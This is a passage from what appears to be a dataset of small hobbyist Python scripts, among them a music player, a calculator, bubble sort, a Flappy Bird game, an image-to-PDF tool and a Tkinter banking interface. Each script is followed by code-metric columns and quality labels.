def prevsong(event):
    global index
    index -= 1
    pygame.mixer.music.load(listofsongs[index])
    pygame.mixer.music.play()
    updatelabel()


def stopsong(event):
    pygame.mixer.music.stop()
    v.set("""")
    # return songname


label = Label(root, text=""Music Player"")
label.pack()

listbox = Listbox(root)
listbox.pack()

# listofsongs.reverse()
realnames.reverse()

for items in realnames:
    listbox.insert(0, items)

realnames.reverse()
# listofsongs.reverse()


nextbutton = Button(root, text=""Next Song"")
nextbutton.pack()

previousbutton = Button(root, text=""Previous Song"")
previousbutton.pack()

stopbutton = Button(root, text=""Stop Music"")
stopbutton.pack()


nextbutton.bind(""<Button-1>"", nextsong)
previousbutton.bind(""<Button-1>"", prevsong)
stopbutton.bind(""<Button-1>"", stopsong)

songlabel.pack()


root.mainloop()
",1841,62,62,38,6,6,0,5.0,7,2,2,,4,,6,10.0,15.509775004326936,1.0,medio,No,False,False,Low,id168
mapit.py,"import sys, webbrowser, pyperclip

if len(sys.argv) > 1:
    address = "" "".join(sys.argv[1:])

elif len(pyperclip.paste()) > 2:
    address = pyperclip.paste()
else:
    address = input(""enter your palce"")
webbrowser.open(""https://www.google.com/maps/place/"" + address)
",280,9,8,2,0,0,0,0.0,0,3,2,6.0,6,8.0,9,17.509775004326936,27.0,1.0,medio,No,True,False,,id169
Simple_Calculator.py,"# Program make a simple calculator

# This function adds two numbers
def add(x, y):
    return x + y

# This function subtracts two numbers
def subtract(x, y):
    return x - y

# This function multiplies two numbers
def multiply(x, y):
    return x * y

# This function divides two numbers
def divide(x, y):
    return x / y

# This function gives the remainder of two numbers
def mod(x,y):
    return x % y


print(""Select operation."")
print(""1.Add"")
print(""2.Subtract"")
print(""3.Multiply"")
print(""4.Divide"")
print(""5.Modulo division"")

while True:
    # Take input from the user
    choice = input(""Enter choice(1/2/3/4/5): "")

    # Check if choice is one of the four options
    if choice in ('1', '2', '3', '4','5'):
        num1 = float(input(""Enter first number: ""))
        num2 = float(input(""Enter second number: ""))

        if choice == '1':
            print(num1, ""+"", num2, ""="", add(num1, num2))

        elif choice == '2':
            print(num1, ""-"", num2, ""="", subtract(num1, num2))

        elif choice == '3':
            print(num1, ""*"", num2, ""="", multiply(num1, num2))

        elif choice == '4':
            print(num1, ""/"", num2, ""="", divide(num1, num2))
        
        elif choice == '5':
            print(num1, ""%"", num2, ""="", mod(num1, num2))
        break
    else:
        print(""Invalid Input"")
",1332,34,34,14,8,8,0,5.0,5,11,7,,17,,33,89.13835275565901,151.30376252379818,4.529411764705882,medio,No,True,False,Low-Medium,id170
Shortest Distance between Two Lines.py,"import math
import numpy as NP

LC1 = eval(input(""Enter DRs of Line 1 : ""))
LP1 = eval(input(""Enter Coordinate through which Line 1 passes : ""))
LC2 = eval(input(""Enter DRs of Line 2 : ""))
LP2 = eval(input(""Enter Coordinate through which Line 2 passes : ""))
a1, b1, c1, a2, b2, c2 = LC1[0], LC1[1], LC1[2], LC2[0], LC2[1], LC2[2]
x = NP.array(
    [[LP2[0] - LP1[0], LP2[1] - LP1[1], LP2[2] - LP1[2]], [a1, b1, c1], [a2, b2, c2]]
)
y = math.sqrt(
    (((b1 * c2) - (b2 * c1)) ** 2)
    + (((c1 * a2) - (c2 * a1)) ** 2)
    + (((a1 * b2) - (b1 * a2)) ** 2)
)
",558,9,15,1,0,0,0,0.0,0,17,4,34.0,26,30.0,51,130.2114326716684,250.25142037603445,2.6153846153846154,medio,No,True,False,Low-Medium,id171
bubblesortpgm.py,"""""""Bubble Sort
Bubble Sort is the simplest sorting algorithm that works by repeatedly swapping the adjacent elements if they are in wrong order.
Example:
First Pass:
( 5 1 4 2 8 ) â> ( 1 5 4 2 8 ), Here, algorithm compares the first two elements, and swaps since 5 > 1.
( 1 5 4 2 8 ) â>  ( 1 4 5 2 8 ), Swap since 5 > 4
( 1 4 5 2 8 ) â>  ( 1 4 2 5 8 ), Swap since 5 > 2
( 1 4 2 5 8 ) â> ( 1 4 2 5 8 ), Now, since these elements are already in order (8 > 5), algorithm does not swap them.

Second Pass:
( 1 4 2 5 8 ) â> ( 1 4 2 5 8 )
( 1 4 2 5 8 ) â> ( 1 2 4 5 8 ), Swap since 4 > 2
( 1 2 4 5 8 ) â> ( 1 2 4 5 8 )
( 1 2 4 5 8 ) â>  ( 1 2 4 5 8 )
Now, the array is already sorted, but our algorithm does not know if it is completed. The algorithm needs one whole pass without any swap to know it is sorted.

Third Pass:
( 1 2 4 5 8 ) â> ( 1 2 4 5 8 )
( 1 2 4 5 8 ) â> ( 1 2 4 5 8 )
( 1 2 4 5 8 ) â> ( 1 2 4 5 8 )
( 1 2 4 5 8 ) â> ( 1 2 4 5 8 )""""""

# Python program for implementation of Bubble Sort


def bubbleSort(arr):
    n = len(arr)

    # Traverse through all array elements
    for i in range(n):
        not_swap = True
        # Last i elements are already in place
        for j in range(0, n - i - 1):

            # traverse the array from 0 to n-i-1
            # Swap if the element found is greater
            # than the next element
            if arr[j] > arr[j + 1]:
                arr[j], arr[j + 1] = arr[j + 1], arr[j]
                not_swap = False
        if not_swap:
            break


# Driver code to test above
arr = [64, 34, 25, 12, 22, 11, 90]

bubbleSort(arr)

print(""Sorted array is:"")
for i in range(len(arr)):
    print(""%d"" % arr[i]),
",1698,16,15,11,7,7,19,,5,7,4,14.0,9,,21,36.52932501298081,77.70923408096293,3.111111111111111,medio,No,False,False,Low,id172
Flappy Bird.py,"__author__ = ""Jean Loui Bernard Silva de Jesus""
__version__ = ""1.0""

import os.path
from datetime import timedelta
from time import time
from tkinter import Tk, Button

from Background import Background
from Bird import Bird
from Settings import Settings
from Tubes import Tubes


class App(Tk, Settings):
    """"""
    Classe principal do jogo onde tudo serÃ¡ executado
    """"""

    # VariÃ¡veis privadas e ajustes internos
    __background_animation_speed = 720
    __bestScore = 0
    __bird_descend_speed = 38.4
    __buttons = []
    __playing = False
    __score = 0
    __time = ""%H:%M:%S""

    def __init__(self):

        Tk.__init__(self)
        self.setOptions()

        # Se o tamanho da largura e altura da janela forem definidos, eles serÃ£o usados no jogo.
        # Caso eles tenham o valor None, o tamanho da janela serÃ¡ o tamanho do monitor do usuÃ¡rio.

        if all([self.window_width, self.window_height]):
            self.__width = self.window_width
            self.__height = self.window_height
        else:
            self.__width = self.winfo_screenwidth()
            self.__height = self.winfo_screenheight()

        # Configura a janela do programa
        self.title(self.window_name)
        self.geometry(""{}x{}"".format(self.__width, self.__height))
        self.resizable(*self.window_rz)
        self.attributes(""-fullscreen"", self.window_fullscreen)
        self[""bg""] = ""black""

        # Verifica se existem as imagens do jogo
        for file in self.images_fp:
            if not os.path.exists(file):
                raise FileNotFoundError(
                    ""The following file was not found:\n{}"".format(file)
                )

        # Carrega a imagem do botÃ£o para comeÃ§ar o jogo
        self.__startButton_image = Background.getPhotoImage(
            image_path=self.startButton_fp,
            width=(self.__width // 100) * self.button_width,
            height=(self.__height // 100) * self.button_height,
            closeAfter=True,
        )[0]

        # Carrega a imagem do botÃ£o para sair do jogo
        self.__exitButton_image = Background.getPhotoImage(
            image_path=self.exitButton_fp,
            width=(self.__width // 100) * self.button_width,
            height=(self.__height // 100) * self.button_height,
            closeAfter=True,
        )[0]

        # Carrega a imagem do tÃ­tulo do jogo
        self.__title_image = Background.getPhotoImage(
            image_path=self.title_fp,
            width=(self.__width // 100) * self.title_width,
            height=(self.__height // 100) * self.title_height,
            closeAfter=True,
        )[0]

        # Carrega a imagem do placar do jogo
        self.__scoreboard_image = Background.getPhotoImage(
            image_path=self.scoreboard_fp,
            width=(self.__width // 100) * self.scoreboard_width,
            height=(self.__height // 100) * self.scoreboard_height,
            closeAfter=True,
        )[0]

        # Define a velocidade da animaÃ§Ã£o do background com base na largura da janela
        self.__background_animation_speed //= self.__width / 100
        self.__background_animation_speed = int(self.__background_animation_speed)

        # Define a velocidade de descida do pÃ¡ssaro com base na altura da janela
        self.__bird_descend_speed //= self.__height / 100
        self.__bird_descend_speed = int(self.__bird_descend_speed)

    def changeFullscreenOption(self, event=None):
        """"""
        MÃ©todo para colocar o jogo no modo ""fullscreen"" ou ""window""
        """"""

        self.window_fullscreen = not self.window_fullscreen
        self.attributes(""-fullscreen"", self.window_fullscreen)

    def close(self, event=None):
        """"""
        MÃ©todo para fechar o jogo
        """"""

        # Salva a melhor pontuaÃ§Ã£o do jogador antes de sair do jogo
        self.saveScore()

        # Tenta interromper os processos
        try:
            self.__background.stop()
            self.__bird.kill()
            self.__tubes.stop()
        finally:
            quit()

    def createMenuButtons(self):
        """"""
        MÃ©todo para criar os botÃµes de menu
        """"""

        # Define o tamanho do botÃ£o em porcentagem com base no tamanho da janela
        width = (self.__width // 100) * self.button_width
        height = (self.__height // 100) * self.button_height

        # Cria um botÃ£o para comeÃ§ar o jogo
        startButton = Button(
            self,
            image=self.__startButton_image,
            bd=0,
            command=self.start,
            cursor=self.button_cursor,
            bg=self.button_bg,
            activebackground=self.button_activebackground,
        )
        # Coloca o botÃ£o dentro do background ( Canvas )
        self.__buttons.append(
            self.__background.create_window(
                (self.__width // 2) - width // 1.5,
                int(self.__height / 100 * self.button_position_y),
                window=startButton,
            )
        )

        # Cria um botÃ£o para sair do jogo
        exitButton = Button(
            self,
            image=self.__exitButton_image,
            bd=0,
            command=self.close,
            cursor=self.button_cursor,
            bg=self.button_bg,
            activebackground=self.button_activebackground,
        )

        # Coloca o botÃ£o dentro do background ( Canvas )
        self.__buttons.append(
            self.__background.create_window(
                (self.__width // 2) + width // 1.5,
                int(self.__height / 100 * self.button_position_y),
                window=exitButton,
            )
        )

    def createScoreBoard(self):
        """"""
        MÃ©todo para criar a imagem do placar do jogo no background
        junto com as informaÃ§Ãµes do jogador.
        """"""

        # Define a posiÃ§Ã£o X e Y
        x = self.__width // 2
        y = (self.__height // 100) * self.scoreboard_position_y

        # Calcula o tamanho da imagem do placar
        scoreboard_w = (self.__width // 100) * self.scoreboard_width
        scoreboard_h = (self.__width // 100) * self.scoreboard_height

        # Calcula a posiÃ§Ã£o X e Y do texto da pontuaÃ§Ã£o do Ãºltimo jogo
        score_x = x - scoreboard_w / 100 * 60 / 2
        score_y = y + scoreboard_h / 100 * 10 / 2

        # Calcula a posiÃ§Ã£o X e Y do texto da melhor pontuaÃ§Ã£o do jogador
        bestScore_x = x + scoreboard_w / 100 * 35 / 2
        bestScore_y = y + scoreboard_h / 100 * 10 / 2

        # Calcula a posiÃ§Ã£o X e Y do texto do tempo de jogo
        time_x = x
        time_y = y + scoreboard_h / 100 * 35 / 2

        # Define a fonte dos textos
        font = (self.text_font, int(0.02196 * self.__width + 0.5))

        # Cria a imagem do placar no background
        self.__background.create_image(x, y, image=self.__scoreboard_image)

        # Cria texto para mostrar o score do Ãºltimo jogo
        self.__background.create_text(
            score_x,
            score_y,
            text=""Score: %s"" % self.__score,
            fill=self.text_fill,
            font=font,
        )

        # Cria texto para mostrar a melhor pontuaÃ§Ã£o do jogador
        self.__background.create_text(
            bestScore_x,
            bestScore_y,
            text=""Best Score: %s"" % self.__bestScore,
            fill=self.text_fill,
            font=font,
        )

        # Cria texto para mostrar o tempo de jogo
        self.__background.create_text(
            time_x,
            time_y,
            text=""Time: %s"" % self.__time,
            fill=self.text_fill,
            font=font,
        )

    def createTitleImage(self):
        """"""
        MÃ©todo para criar a imagem do tÃ­tulo do jogo no background
        """"""

        self.__background.create_image(
            self.__width // 2,
            (self.__height // 100) * self.title_position_y,
            image=self.__title_image,
        )

    def deleteMenuButtons(self):
        """"""
        MÃ©todo para deletar os botÃµes de menu
        """"""

        # Deleta cada botÃ£o criado dentro do background
        for item in self.__buttons:
            self.__background.delete(item)

        # Limpa a lista de botÃµes
        self.__buttons.clear()

    def gameOver(self):
        """"""
        MÃ©todo de fim de jogo
        """"""

        # Calcula o tempo jogado em segundos e depois o formata
        self.__time = int(time() - self.__time)
        self.__time = str(timedelta(seconds=self.__time))

        # Interrompe a animaÃ§Ã£o do plano de fundo e a animaÃ§Ã£o dos tubos
        self.__background.stop()
        self.__tubes.stop()

        # Declara que o jogo nÃ£o estÃ¡ mais em execuÃ§Ã£o
        self.__playing = False

        # Cria os botÃµes inciais
        self.createMenuButtons()

        # Cria image do tÃ­tulo do jogo
        self.createTitleImage()

        # Cria imagem do placar e mostra as informaÃ§Ãµes do jogo passado
        self.createScoreBoard()

    def increaseScore(self):
        """"""
        MÃ©todo para aumentar a pontuaÃ§Ã£o do jogo atual do jogador
        """"""

        self.__score += 1
        if self.__score > self.__bestScore:
            self.__bestScore = self.__score

    def init(self):
        """"""
        MÃ©todo para iniciar o programa em si, criando toda a parte grÃ¡fica inicial do jogo
        """"""

        # self.createMenuButtons()
        self.loadScore()

        # Cria o plano de fundo do jogo
        self.__background = Background(
            self,
            self.__width,
            self.__height,
            fp=self.background_fp,
            animation_speed=self.__background_animation_speed,
        )

        # Foca o plano de fundo para que seja possÃ­vel definir os eventos
        self.__background.focus_force()
        # Define evento para trocar o modo de janela para ""fullscreen"" ou ""window""
        self.__background.bind(
            self.window_fullscreen_event, self.changeFullscreenOption
        )
        # Define evento para comeÃ§ar o jogo
        self.__background.bind(self.window_start_event, self.start)
        # Define evento para sair do jogo
        self.__background.bind(self.window_exit_event, self.close)

        # Define um mÃ©todo caso o usuÃ¡rio feche a janela do jogo
        self.protocol(""WM_DELETE_WINDOW"", self.close)

        # Empacota o objeto background
        self.__background.pack()

        # Cria os botÃµes do menu do jogo
        self.createMenuButtons()

        # Cria imagem do tÃ­tulo do jogo
        self.createTitleImage()

        # Cria um pÃ¡ssaro inicial no jogo
        self.__bird = Bird(
            self.__background,
            self.gameOver,
            self.__width,
            self.__height,
            fp=self.bird_fp,
            event=self.bird_event,
            descend_speed=self.__bird_descend_speed,
        )

    def loadScore(self):
        """"""
        MÃ©todo para carregar a pontuaÃ§Ã£o do jogador
        """"""

        # Tenta carregar o placar do usuÃ¡rio
        try:
            file = open(self.score_fp)
            self.__bestScore = int(file.read(), 2)
            file.close()

        # Se nÃ£o for possÃ­vel, serÃ¡ criado um arquivo para guardar o placar
        except BaseException:
            file = open(self.score_fp, ""w"")
            file.write(bin(self.__bestScore))
            file.close()

    def saveScore(self):
        """"""
        MÃ©todo para salvar a pontuaÃ§Ã£o do jogador
        """"""

        with open(self.score_fp, ""w"") as file:
            file.write(bin(self.__bestScore))

    def start(self, event=None):
        """"""
        MÃ©todo para inicializar o jogo
        """"""

        # Este mÃ©todo Ã© executado somente se o jogador nÃ£o estiver jÃ¡ jogando
        if self.__playing:
            return

        # Reinicia o placar
        self.__score = 0
        self.__time = time()

        # Remove os botÃµes de menu
        self.deleteMenuButtons()

        # Reinicia o background
        self.__background.reset()

        # Inicializa a animaÃ§Ã£o do background se True
        if self.background_animation:
            self.__background.run()

        # Cria um pÃ¡ssaro no jogo
        self.__bird = Bird(
            self.__background,
            self.gameOver,
            self.__width,
            self.__height,
            fp=self.bird_fp,
            event=self.bird_event,
            descend_speed=self.__bird_descend_speed,
        )

        # Cria tubos no jogo
        self.__tubes = Tubes(
            self.__background,
            self.__bird,
            self.increaseScore,
            self.__width,
            self.__height,
            fp=self.tube_fp,
            animation_speed=self.__background_animation_speed,
        )

        # Inicializa a animaÃ§Ã£o do pÃ¡ssaro e dos tubos
        self.__bird.start()
        self.__tubes.start()


if __name__ == ""__main__"":
    try:
        app = App()
        app.init()
        app.mainloop()

    except FileNotFoundError as error:
        print(error)
",13014,153,244,78,57,57,40,,23,75,9,148.0,94,103.0,223,644.6606770706787,1491.0896175618575,7.085106382978723,medio,Yes,False,False,Very High,id173
cartesian_product.py,"""""""Cartesian Product of Two Lists.""""""

# Import
from itertools import product


# Cartesian Product of Two Lists
def cartesian_product(list1, list2):
    """"""Cartesian Product of Two Lists.""""""
    for _i in list1:
        for _j in list2:
            print((_i, _j), end=' ')


# Main
if __name__ == '__main__':
    list1 = input().split()
    list2 = input().split()

    # Convert to ints
    list1 = [int(i) for i in list1]
    list2 = [int(i) for i in list2]

    cartesian_product(list1, list2)

",500,13,11,8,4,6,0,1.0,3,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,alto,No,True,False,Low,id174
armstrongnumber.py,"# Python program to check if the number is an Armstrong number or not

# take input from the user
num = int(input(""Enter a number: ""))

# initialize sum
sum = 0

# find the sum of the cube of each digit
temp = num
while temp > 0:
    digit = temp % 10
    sum += digit ** 3
    temp //= 10

# display the result
if num == sum:
    print(num, ""is an Armstrong number"")
else:
    print(num, ""is not an Armstrong number"")
",419,11,11,4,5,5,0,0.0,0,6,6,12.0,8,,18,39.50977500432694,68.53238859703687,4.5,alto,No,True,False,Low,id175
google.py,"""""""
Author: Ankit Agarwal (ankit167)
Usage: python google.py <keyword>
Description: Script googles the keyword and opens
             top 5 (max) search results in separate
             tabs in the browser
Version: 1.0
""""""

import sys
import webbrowser

import bs4
import pyperclip
import requests


def main():
    if len(sys.argv) > 1:
        keyword = "" "".join(sys.argv[1:])
    else:
        # if no keyword is entered, the script would search for the keyword
        # copied in the clipboard
        keyword = pyperclip.paste()

    res = requests.get(""http://google.com/search?q="" + keyword)
    res.raise_for_status()
    soup = bs4.BeautifulSoup(res.text)
    linkElems = soup.select("".r a"")
    numOpen = min(5, len(linkElems))

    for i in range(numOpen):
        webbrowser.open(""http://google.com"" + linkElems[i].get(""href""))


if __name__ == ""__main__"":
    main()
",881,21,19,8,2,2,8,1.0,3,4,3,8.0,8,,12,28.75488750216347,41.51317942364757,1.5,alto,No,False,False,Low,id176
image2pdf.py,"from PIL import Image
import os


class image2pdf:
    def __init__(self):
        self.validFormats = ("".jpg"", "".jpeg"", "".png"", "".JPG"", "".PNG"")
        self.pictures = []
        
        self.directory = """"
        self.isMergePDF = True 


    def getUserDir(self):
        """""" Allow user to choose image directory """"""

        msg = ""\n1. Current directory\n2. Custom directory\nEnter a number: ""
        user_option = int(input(msg))

        # Restrict input to either (1 or 2)
        while user_option <= 0 or user_option >= 3:
            user_option = int(input(f""\n*Invalid input*\n{msg}""))

        self.directory = os.getcwd() if user_option == 1 else input(""\nEnter custom directory: "")
        
    def filter(self, item):
        return item.endswith(self.validFormats)

    def sortFiles(self):
        return sorted(os.listdir(self.directory))

    def getPictures(self):
        pictures = list(filter(self.filter, self.sortFiles()))

        if not pictures:
            print(f"" [Error] there are no pictures in the directory: {self.directory} "")
            return False
        
        print(f""Found picture(s) :"")
        return pictures

    def selectPictures(self, pictures):
        """""" Allow user to manually pick each picture or merge all """"""

        listedPictures = {}
        for index, pic in enumerate(pictures):
            listedPictures[index+1] = pic
            print(f""{index+1}: {pic}"")
        
        userInput = input(""\n Enter the number(s) - (comma seperated/no spaces) or (A or a) to merge All \nChoice: "").strip().lower()
        
        if userInput != ""a"":
            # Convert user input (number) into corresponding (image title)
            pictures = (
                listedPictures.get(int(number)) for number in userInput.split(',')
            )

            self.isMergePDF = False

        return pictures

    
    def convertPictures(self):
        """"""
            Convert pictures according the following:
            * If pictures = 0 -> Skip 
            * If pictures = 1 -> use all 
            * Else            -> allow user to pick pictures

            Then determine to merge all or one pdf
        """"""

        pictures = self.getPictures()
        totalPictures = len(pictures) if pictures else 0
        
        if totalPictures == 0:
            return
        
        elif totalPictures >= 2:
            pictures = self.selectPictures(pictures)
        
        if self.isMergePDF:
            # All pics in one pdf. 
            for picture in pictures:
                self.pictures.append(Image.open(f""{self.directory}\\{picture}"").convert(""RGB""))
            self.save()

        else:
            # Each pic in seperate pdf. 
            for picture in pictures:
                self.save(Image.open(f""{self.directory}\\{picture}"").convert(""RGB""), picture, False)

        # Reset to default value for next run
        self.isMergePDF = True
        self.pictures = []
        print(f""\n{'#'*30}"")
        print(""            Done! "")
        print(f""{'#'*30}\n"")

    def save(self, image=None, title=""All-PDFs"", isMergeAll=True):
        # Save all to one pdf or each in seperate file

        if isMergeAll:
            self.pictures[0].save(
                f""{self.directory}\\{title}.pdf"", 
                save_all=True, 
                append_images=self.pictures[1:]
            )
        
        else:
            image.save(f""{self.directory}\\{title}.pdf"")


if __name__ == ""__main__"":
    
    # Get user directory only once
    process = image2pdf()
    process.getUserDir()
    process.convertPictures()

    # Allow user to rerun any process
    while True:
        user = input(""Press (R or r) to Run again\nPress (C or c) to change directory\nPress (Any Key) To Exit\nchoice:"").lower()
        match user:
            case ""r"":
                process.convertPictures()
            case ""c"":
                process.getUserDir()
                process.convertPictures()
            case _:
                break
                

",4040,77,79,37,8,10,7,8.0,25,13,8,25.0,18,26.0,38,99.0586500259616,178.61670928936152,5.555555555555555,medio,Yes,True,False,Low-Medium,id177
frontend.py,"# importing all modules
import tkinter.messagebox
from tkinter import *

import backend

backend.connect_database()


# A function for check that acc_no is integer or not
def check_string_in_account_no(check_acc_no):
    r = check_acc_no.isdigit()
    return r


# all buttons of page2
def create():
    def create_customer_in_database():
        def delete_create():
            create_employee_frame.grid_forget()
            page2()

        name = entry5.get()
        age = entry6.get()
        address = entry7.get()
        balance = entry8.get()
        acc_type = entry9.get()
        mobile_number = entry10.get()
        if (
            len(name) != 0
            and len(age) != 0
            and len(address) != 0
            and len(balance) != 0
            and len(acc_type) != 0
            and len(mobile_number) != 0
        ):

            acc_no = backend.create_customer(
                name, age, address, balance, acc_type, mobile_number
            )

            label = Label(
                create_employee_frame, text=""Your account number is {}"".format(acc_no)
            )
            label.grid(row=14)

            button = Button(create_employee_frame, text=""Exit"", command=delete_create)
            button.grid(row=15)
        else:
            label = Label(create_employee_frame, text=""Please fill all entries"")
            label.grid(row=14)

            button = Button(create_employee_frame, text=""Exit"", command=delete_create)
            button.grid(row=15)

    frame1.grid_forget()
    global create_employee_frame
    create_employee_frame = Frame(tk, bg=""black"")
    create_employee_frame.grid(padx=500, pady=150)

    label = Label(create_employee_frame, text=""Customer Detail"", font=""bold"")
    label.grid(row=0, pady=4)
    label = Label(create_employee_frame, text=""Name"", font=""bold"")
    label.grid(row=1, pady=4)
    global entry5
    entry5 = Entry(create_employee_frame)
    entry5.grid(row=2, pady=4)
    label = Label(create_employee_frame, text=""Age"", font=""bold"")
    label.grid(row=3, pady=4)
    global entry6
    entry6 = Entry(create_employee_frame)
    entry6.grid(row=4, pady=4)
    label = Label(create_employee_frame, text=""address"", font=""bold"")
    label.grid(row=5, pady=4)
    global entry7
    entry7 = Entry(create_employee_frame)
    entry7.grid(row=6, pady=4)
    label = Label(create_employee_frame, text=""Balance"", font=""bold"")
    label.grid(row=7, pady=4)
    global entry8
    entry8 = Entry(create_employee_frame)
    entry8.grid(row=8, pady=4)
    label = Label(create_employee_frame, text=""Account Type"", font=""bold"")
    label.grid(row=9, pady=4)
    label = Label(create_employee_frame, text=""Mobile number"", font=""bold"")
    label.grid(row=11, pady=4)
    global entry9
    entry9 = Entry(create_employee_frame)
    entry9.grid(row=10, pady=4)
    global entry10
    entry10 = Entry(create_employee_frame)
    entry10.grid(row=12, pady=4)
    button = Button(
        create_employee_frame, text=""Submit"", command=create_customer_in_database
    )
    button.grid(row=13, pady=4)

    mainloop()


def search_acc():
    frame1.grid_forget()
    global search_frame
    search_frame = Frame(tk)
    search_frame.grid(padx=500, pady=300)

    label = Label(search_frame, text=""Enter account number"", font=""bold"")
    label.grid(row=0, pady=6)

    global entry11
    entry11 = Entry(search_frame)
    entry11.grid(row=1, pady=6)

    button = Button(search_frame, text=""Search"", command=show)
    button.grid(row=3)

    mainloop()


def show():
    def clear_show_frame():
        show_frame.grid_forget()
        page2()

    def back_page2():
        search_frame.grid_forget()
        page2()

    acc_no = entry11.get()
    r = check_string_in_account_no(acc_no)
    if len(acc_no) != 0 and r:
        details = backend.get_details(acc_no)
        if details != False:
            search_frame.grid_forget()
            global show_frame
            show_frame = Frame(tk)
            show_frame.grid(padx=400, pady=200)

            label = Label(
                show_frame, text=""Account_number:\t{}"".format(details[0]), font=""bold""
            )
            label.grid(row=0, pady=6)
            label = Label(show_frame, text=""Name:\t{}"".format(details[1]), font=""bold"")
            label.grid(row=1, pady=6)
            label = Label(show_frame, text=""Age:\t{}"".format(details[2]), font=""bold"")
            label.grid(row=2, pady=6)
            label = Label(
                show_frame, text=""Address:\t{}"".format(details[3]), font=""bold""
            )
            label.grid(row=3, pady=6)
            label = Label(
                show_frame, text=""Balance:\t{}"".format(details[4]), font=""bold""
            )
            label.grid(row=4, pady=6)
            label = Label(
                show_frame, text=""Account_type:\t{}"".format(details[5]), font=""bold""
            )
            label.grid(row=5, pady=6)
            label = Label(
                show_frame, text=""Mobile Number:\t{}"".format(details[6]), font=""bold""
            )
            label.grid(row=6, pady=6)
            button = Button(
                show_frame,
                text=""Exit"",
                command=clear_show_frame,
                width=20,
                height=2,
                bg=""red"",
                fg=""white"",
            )
            button.grid(row=7, pady=6)
            mainloop()
        else:
            label = Label(search_frame, text=""Account Not Found"")
            label.grid()
            button = Button(search_frame, text=""Exit"", command=back_page2)
            button.grid()

    else:
        label = Label(search_frame, text=""Enter correct account number"")
        label.grid()
        button = Button(search_frame, text=""Exit"", command=back_page2)
        button.grid()


def add():
    frame1.grid_forget()

    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()

        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text=""invalid account number"")
                label.grid(pady=2)
                button = Button(search_frame, text=""Exit"", command=back_page2)
                button.grid()
                mainloop()
            else:

                def update_money():
                    new_money = entry12.get()
                    backend.update_balance(new_money, acc_no)
                    add_frame.grid_forget()
                    page2()

                search_frame.grid_forget()
                global add_frame
                add_frame = Frame(tk)
                add_frame.grid(padx=400, pady=300)

                detail = backend.get_detail(acc_no)

                label = Label(
                    add_frame, text=""Account holder name:   {}"".format(detail[0][0])
                )
                label.grid(row=0, pady=3)

                label = Label(
                    add_frame, text=""Current amount:   {}"".format(detail[0][1])
                )
                label.grid(row=1, pady=3)

                label = Label(add_frame, text=""Enter Money"")
                label.grid(row=2, pady=3)
                global entry12
                entry12 = Entry(add_frame)
                entry12.grid(row=3, pady=3)

                button = Button(add_frame, text=""Add"", command=update_money)
                button.grid(row=4)

                mainloop()
        else:
            label = Label(search_frame, text=""Enter correct account number"")
            label.grid(pady=2)
            button = Button(search_frame, text=""Exit"", command=back_page2)
            button.grid()
            mainloop()

    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)

        label = Label(search_frame, text=""Enter account number"", font=""bold"")
        label.grid(row=0, pady=6)

        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)

        button = Button(search_frame, text=""Search"", command=search_in_database)
        button.grid(row=3)

        mainloop()

    search_acc()


def withdraw():
    frame1.grid_forget()

    def search_in_database():
        def go_page2():
            search_frame.grid_forget()
            page2()

        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)
        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text=""invalid account number"")
                label.grid(pady=2)
                button = Button(search_frame, text=""Exit"", command=go_page2)
                button.grid()
                mainloop()
            else:

                def deduct_money():
                    new_money = entry12.get()
                    result = backend.deduct_balance(new_money, acc_no)
                    if result:
                        add_frame.grid_forget()
                        page2()
                    else:
                        label = Label(search_frame, text=""Insufficient Balance"")
                        label.grid(row=4)

                        button = Button(search_frame, text=""Exit"", command=go_page2)
                        button.grid(row=5)

                        mainloop()

                search_frame.grid_forget()
                global add_frame
                add_frame = Frame(tk)
                add_frame.grid(padx=400, pady=300)
                detail = backend.get_detail(acc_no)

                label = Label(
                    add_frame, text=""Account holder name:   {}"".format(detail[0][0])
                )
                label.grid(row=0, pady=3)

                label = Label(
                    add_frame, text=""Current amount:   {}"".format(detail[0][1])
                )
                label.grid(row=1, pady=3)

                label = Label(add_frame, text=""Enter Money"")
                label.grid(row=2, pady=3)
                global entry12
                entry12 = Entry(add_frame)
                entry12.grid(row=3, pady=3)

                button = Button(add_frame, text=""Withdraw"", command=deduct_money)
                button.grid(row=4)

                mainloop()
        else:
            label = Label(search_frame, text=""Enter correct account number"")
            label.grid(row=4)

            button = Button(search_frame, text=""Exit"", command=go_page2)
            button.grid(row=5)

            mainloop()

    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)

        label = Label(search_frame, text=""Enter account number"", font=""bold"")
        label.grid(row=0, pady=6)

        global entry11
        entry11 = Entry(search_frame)
        entry11.grid(row=1, pady=6)

        button = Button(search_frame, text=""Search"", command=search_in_database)
        button.grid(row=3)

        mainloop()

    search_acc()


def check():
    frame1.grid_forget()

    def search_in_database():
        def back_page2():
            search_frame.grid_forget()
            page2()

        global result
        global acc_no
        acc_no = entry11.get()
        r = check_string_in_account_no(acc_no)

        if len(acc_no) != 0 and r:
            result = backend.check_acc_no(acc_no)
            print(result)
            if not result:
                label = Label(search_frame, text=""invalid account number"")
                label.grid(pady=2)
                button = Button(search_frame, text=""Exit"", command=back_page2)
                button.grid()
                mainloop()
            else:

                def delete_check_frame():
                    check_frame.grid_forget()
                    page2()

                search_frame.grid_forget()
                balance = backend.check_balance(acc_no)
                global check_frame
                check_frame = Frame(tk)
                check_frame.grid(padx=500, pady=300)

                label = Label(
                    check_frame, text=""Balance Is:{}"".format(balance), font=""bold""
                )
                label.grid(row=0, pady=4)

                button = Button(
                    check_frame,
                    text=""Back"",
                    command=delete_check_frame,
                    width=20,
                    height=2,
                    bg=""red"",
                )
                button.grid(row=1)

                mainloop()
        else:
            label = Label(search_frame, text=""Enter correct entry"")
            label.grid(pady=2)
            button = Button(search_frame, text=""Exit"", command=back_page2)
            button.grid()
            mainloop()

    def search_acc():
        global search_frame
        search_frame = Frame(tk)
        search_frame.grid(padx=500, pady=300)

        label = Label(search_frame, text=""Enter account number"", font=""bold"")
